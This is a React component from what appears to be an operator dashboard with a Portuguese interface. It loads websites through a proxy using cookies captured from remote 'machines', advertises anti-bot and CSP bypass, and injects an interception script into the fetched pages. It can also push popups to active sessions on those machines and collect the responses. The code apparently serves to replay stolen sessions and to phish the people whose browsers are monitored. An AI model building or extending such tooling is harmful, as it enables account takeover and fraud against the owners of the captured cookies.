import { useState, useEffect, useRef } from "react";
import { Globe, RefreshCw, AlertCircle, MessageSquare, Ban } from "lucide-react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { toast } from "sonner";
import { supabase } from "@/integrations/supabase/client";
import PopupTemplateModal from "@/components/modals/PopupTemplateModal";
import PopupResponsesPanel from "@/components/PopupResponsesPanel";

interface LiveSiteViewerProps {
  incident: {
    id: string;
    host: string;
    tab_url?: string;
    cookie_data?: any;
    full_cookie_data?: any;
  };
  onClose: () => void;
}

const PROXY_BASE = 'https://vxvcquifgwtbjghrcjbp.supabase.co/functions/v1/site-proxy';

export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
  const [srcDoc, setSrcDoc] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [cookies, setCookies] = useState<any[]>([]);
  const [currentUrl, setCurrentUrl] = useState<string | null>(null);
  const [iframeKey, setIframeKey] = useState(0);
  const [isPopupModalOpen, setIsPopupModalOpen] = useState(false);
  const [resolvedSession, setResolvedSession] = useState<{ machine_id: string; tab_id: string } | null>(null);

  // Parse cookies from incident data
  useEffect(() => {
    const cookieSource = incident.full_cookie_data 
      || incident.cookie_data 
      || (incident as any).cookie_excerpt 
      || (incident as any).cookieExcerpt;
    
    if (cookieSource) {
      try {
        let parsedData;
        
        if (typeof cookieSource === 'string') {
          try {
            parsedData = JSON.parse(cookieSource);
          } catch {
            if (cookieSource.includes('=')) {
              parsedData = cookieSource.split(';').map(pair => {
                const [name, ...valueParts] = pair.trim().split('=');
                return {
                  name: name.trim(),
                  value: valueParts.join('=').trim(),
                  domain: incident.host,
                  path: '/'
                };
              }).filter(c => c.name && c.value);
            }
          }
        } else {
          parsedData = cookieSource;
        }

        let cookieArray = [];
        
        if (Array.isArray(parsedData)) {
          cookieArray = parsedData
            .filter(c => c && typeof c === 'object' && c.name && c.value && c._type !== 'undefined')
            .map(c => ({
              ...c,
              domain: c.domain || incident.host,
              path: c.path || '/'
            }));
        } else if (parsedData && typeof parsedData === 'object') {
          cookieArray = Object.entries(parsedData)
            .filter(([name, value]) => name && value && value !== 'undefined')
            .map(([name, value]) => ({
              name,
              value: String(value),
              domain: incident.host,
              path: '/'
            }));
        }
        
        console.log('[LocalProxy] Parsed cookies:', cookieArray.length, 'cookies');
        setCookies(cookieArray);
      } catch (error) {
        console.error('Error parsing cookie data:', error);
        setCookies([]);
      }
    } else {
      setCookies([]);
    }
  }, [incident.full_cookie_data, incident.cookie_data, (incident as any).cookie_excerpt, (incident as any).cookieExcerpt, incident.host]);

  // Fetch raw content from backend (cookies + DNS tunnel via site-proxy)
  // Proxy automatically fetches cookies from DB using incident_id
  const fetchRawContent = async (url: string): Promise<string> => {
    console.log('[LocalProxy] Fetching raw content:', url, 'for incident:', incident.id);
    
    // Build query params - proxy will fetch cookies from DB automatically
    const params = new URLSearchParams({
      url,
      incident: incident.id,
      rawContent: 'true'
    });
    
    const response = await fetch(`${PROXY_BASE}?${params.toString()}`, {
      method: 'GET',
      headers: { 
        'Content-Type': 'application/json'
      }
    });
    
    if (!response.ok) {
      throw new Error(`HTTP ${response.status}: ${await response.text()}`);
    }
    
    return await response.text();
  };

  // Process HTML content locally: rewrite URLs and inject interception script
  const processContent = (html: string, baseUrl: string): string => {
    console.log('[LocalProxy] Processing content for:', baseUrl);
    
    const base = new URL(baseUrl);
    const origin = `${base.protocol}//${base.host}`;
    
    let processed = html;
    
    // Rewrite CSS links
    processed = processed.replace(
      /(<link[^>]+href=["'])([^"']+)(["'][^>]*>)/gi,
      (match, prefix, url, suffix) => {
        try {
          const absolute = new URL(url, origin).href;
          const proxied = `${PROXY_BASE}?url=${encodeURIComponent(absolute)}&incident=${incident.id}&rawContent=true`;
          return `${prefix}${proxied}${suffix}`;
        } catch { return match; }
      }
    );
    
    // Rewrite Scripts
    processed = processed.replace(
      /(<script[^>]+src=["'])([^"']+)(["'][^>]*>)/gi,
      (match, prefix, url, suffix) => {
        try {
          const absolute = new URL(url, origin).href;
          const proxied = `${PROXY_BASE}?url=${encodeURIComponent(absolute)}&incident=${incident.id}&rawContent=true`;
          return `${prefix}${proxied}${suffix}`;
        } catch { return match; }
      }
    );
    
    // Rewrite Images
    processed = processed.replace(
      /(<img[^>]+src=["'])([^"']+)(["'])/gi,
      (match, prefix, url, suffix) => {
        try {
          const absolute = new URL(url, origin).href;
          const proxied = `${PROXY_BASE}?url=${encodeURIComponent(absolute)}&incident=${incident.id}&rawContent=true`;
          return `${prefix}${proxied}${suffix}`;
        } catch { return match; }
      }
    );
    
    // Rewrite anchors (for navigation) - keep original URLs without data attributes
    processed = processed.replace(
      /(<a\s[^>]*href=["'])([^"']+)(["'][^>]*>)/gi,
      (match, prefix, url, suffix) => {
        try {
          const absolute = new URL(url, origin).href;
          return `${prefix}${absolute}${suffix}`;
        } catch { return match; }
      }
    );
    
    // Rewrite forms - keep original URLs without data attributes
    processed = processed.replace(
      /(<form\s[^>]*action=["'])([^"']+)(["'][^>]*>)/gi,
      (match, prefix, url, suffix) => {
        try {
          const absolute = new URL(url, origin).href;
          return `${prefix}${absolute}${suffix}`;
        } catch { return match; }
      }
    );
    
    // Inject custom interception script without data attributes
    const interceptionScript = `
<script>
(function() {
  const BASE_URL = ${JSON.stringify(baseUrl)};
  const INCIDENT_ID = ${JSON.stringify(incident.id)};
  
  console.log('[LocalProxy] Interception active for:', BASE_URL);
  
  // Intercept all link clicks - use href directly (already absolute URLs)
  document.addEventListener('click', function(e) {
    const target = e.target.closest('a');
    if (!target || !target.href) return;
    
    // Skip special protocols
    const href = target.href;
    if (href.startsWith('javascript:') || href.startsWith('mailto:') || href.startsWith('tel:') || href.startsWith('#')) {
      return;
    }
    
    e.preventDefault();
    e.stopPropagation();
    
    console.log('[LocalProxy] Navigate to:', href);
    window.parent.postMessage({ type: 'local-proxy:navigate', url: href, incidentId: INCIDENT_ID }, '*');
  }, true);
  
  // Intercept form submissions
  document.addEventListener('submit', function(e) {
    const form = e.target;
    if (form.method.toUpperCase() === 'GET') {
      e.preventDefault();
      const formData = new FormData(form);
      const params = new URLSearchParams(formData);
      const action = form.action;
      const destination = action + '?' + params.toString();
      console.log('[LocalProxy] Form navigate to:', destination);
      window.parent.postMessage({ type: 'local-proxy:navigate', url: destination, incidentId: INCIDENT_ID }, '*');
    }
  }, true);
  
  // Override window.open
  const originalOpen = window.open;
  window.open = function(url) {
    if (url) {
      window.parent.postMessage({ type: 'local-proxy:navigate', url: url, incidentId: INCIDENT_ID }, '*');
    }
    return null;
  };
  
  // Send ready signal
  window.parent.postMessage({ type: 'local-proxy:ready', url: BASE_URL }, '*');
})();
</script>`;
    
    // Inject script before closing </head> or </body>
    if (processed.includes('</head>')) {
      processed = processed.replace('</head>', `${interceptionScript}</head>`);
    } else if (processed.includes('</body>')) {
      processed = processed.replace('</body>', `${interceptionScript}</body>`);
    } else {
      processed = processed + interceptionScript;
    }
    
    return processed;
  };

  // Handle navigation within the proxied site
  const handleNavigation = async (targetUrl: string) => {
    console.log('[LocalProxy] Navigating to:', targetUrl);
    setError(null);
    setCurrentUrl(targetUrl);
    
    try {
      const rawHtml = await fetchRawContent(targetUrl);
      const processedHtml = processContent(rawHtml, targetUrl);
      
      // Update iframe with new content
      setIframeKey(k => k + 1);
      setSrcDoc(processedHtml);
      
      toast.success('Página carregada');
    } catch (err: any) {
      console.error('[LocalProxy] Navigation error:', err);
      setError(err.message || 'Erro ao navegar');
      toast.error('Falha ao carregar página');
    }
  };

  // Listen for navigation messages from iframe
  useEffect(() => {
    const handleMessage = (event: MessageEvent) => {
      if (event.data?.type === 'local-proxy:ready') {
        console.log('[LocalProxy] ✅ Ready signal received:', event.data.url);
        return;
      }
      
      if (event.data?.type === 'local-proxy:navigate') {
        const { url, incidentId } = event.data;
        if (incidentId !== incident.id) return;
        
        handleNavigation(url);
      }
    };
    
    window.addEventListener('message', handleMessage);
    return () => window.removeEventListener('message', handleMessage);
  }, [incident.id, cookies]);

  const loadSiteWithCookies = async () => {
    if (!incident.tab_url) {
      setError('URL do site não disponível');
      return;
    }

    await handleNavigation(incident.tab_url);
  };

  const refreshSite = () => {
    setSrcDoc(null);
    setTimeout(() => loadSiteWithCookies(), 100);
  };

  // Resolve the active session (machine_id/tab_id) for this incident's domain before opening the popup
  const handleOpenPopup = async () => {
    try {
      const { data, error } = await supabase
        .from('active_sessions')
        .select('machine_id, tab_id, domain, last_activity')
        .eq('domain', incident.host)
        .eq('is_active', true)
        .order('last_activity', { ascending: false })
        .limit(1);

      if (error) {
        console.error('Erro ao buscar sessão ativa:', error);
        setResolvedSession(null);
        setIsPopupModalOpen(true);
        return;
      }

      if (data && data.length > 0) {
        setResolvedSession({ machine_id: data[0].machine_id, tab_id: data[0].tab_id });
      } else {
        setResolvedSession(null);
      }
    } catch (e) {
      console.error('Falha ao resolver sessão ativa:', e);
      setResolvedSession(null);
    } finally {
      setIsPopupModalOpen(true);
    }
  };

  const blockSiteForMachine = async () => {
    const machineId = (incident as any).machine_id;
    
    if (!machineId) {
      toast.error('ID da máquina não disponível');
      return;
    }

    try {
      const { error } = await supabase
        .from('machine_blocked_domains')
        .insert({
          machine_id: machineId,
          domain: incident.host,
          reason: 'Bloqueado via visualizador de site',
          blocked_by: (await supabase.auth.getUser()).data.user?.id
        });

      if (error) throw error;

      toast.success(`Site ${incident.host} bloqueado apenas para ${machineId}`);
    } catch (err: any) {
      console.error('Error blocking site for machine:', err);
      toast.error(err.message || 'Erro ao bloquear site');
    }
  };

  // Convert incident data to session format for PopupTemplateModal
  const sessionData = {
    tab_id: resolvedSession?.tab_id || (incident as any).tab_id || 'unknown',
    machine_id: resolvedSession?.machine_id || (incident as any).machine_id || 'unknown',
    domain: incident.host,
    url: currentUrl || incident.tab_url || '',
    title: null
  };

  return (
    <>
      <div className="w-full h-full flex flex-col gap-4">
        {/* Live Site Viewer Card */}
        <Card className="flex-1 flex flex-col min-h-[500px]">
          <CardHeader className="pb-4 flex-shrink-0">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-2">
                <Globe className="h-5 w-5 text-primary" />
                <CardTitle className="text-lg">Visualizar Site com Cookies</CardTitle>
              </div>
              <Button variant="outline" size="sm" onClick={onClose}>
                Fechar
              </Button>
            </div>
            
            <div className="flex items-center gap-2 text-sm text-muted-foreground flex-wrap">
              <span className="font-medium">Host:</span>
              <span>{incident.host}</span>
              {cookies.length > 0 && (
                <Badge variant="secondary" className="ml-2">
                  {cookies.length} cookies • Anti-bot bypass
                </Badge>
              )}
              <Badge variant="outline" className="ml-2 text-primary border-primary">
                Proxy Local • Sem CSP Supabase
              </Badge>
            </div>

            <div className="flex items-center gap-2 mt-2">
              <Button
                onClick={loadSiteWithCookies}
                disabled={!incident.tab_url}
                size="sm"
                className="gap-2"
              >
                <Globe className="h-4 w-4" />
                Carregar com Cookies
              </Button>
              
              {srcDoc && (
                <Button
                  onClick={refreshSite}
                  variant="outline"
                  size="sm"
                  className="gap-2"
                >
                  <RefreshCw className="h-4 w-4" />
                  Atualizar
                </Button>
              )}
              
              <Button
                onClick={handleOpenPopup}
                variant="default"
                size="sm"
                className="gap-2"
              >
                <MessageSquare className="h-4 w-4" />
                Enviar Popup
              </Button>

              <Button
                onClick={blockSiteForMachine}
                variant="destructive"
                size="sm"
                className="gap-2"
              >
                <Ban className="h-4 w-4" />
                Bloquear Site (Máquina)
              </Button>
            </div>
          </CardHeader>

          <CardContent className="flex-1 p-0 overflow-hidden">
            {error && (
              <Alert variant="destructive" className="m-4">
                <AlertCircle className="h-4 w-4" />
                <AlertDescription>{error}</AlertDescription>
              </Alert>
            )}

            {srcDoc && (
              <iframe
                key={`local-proxy-${iframeKey}`}
                srcDoc={srcDoc}
                className="w-full h-full border-0"
                sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-popups-to-escape-sandbox"
                title={`Site: ${incident.host}`}
                onLoad={() => console.log('[LocalProxy] Iframe loaded')}
                onError={(e) => console.error('[LocalProxy] Iframe error:', e)}
              />
            )}

            {!srcDoc && !error && (
              <div className="flex items-center justify-center h-64 text-center">
                <div>
                  <Globe className="h-12 w-12 mx-auto mb-4 text-muted-foreground" />
                  <p className="text-muted-foreground mb-2">
                    Clique em "Carregar com Cookies" para visualizar o site
                  </p>
                  <p className="text-sm text-muted-foreground">
                    Proxy local com controle total • Sem CSP do Supabase
                  </p>
                </div>
              </div>
            )}
          </CardContent>
        </Card>

        {/* Popup Responses Panel */}
        <div className="w-full">
          <PopupResponsesPanel />
        </div>
      </div>

      {/* Popup Template Modal */}
      <PopupTemplateModal
        isOpen={isPopupModalOpen}
        onClose={() => setIsPopupModalOpen(false)}
        session={sessionData}
      />
    </>
  );
};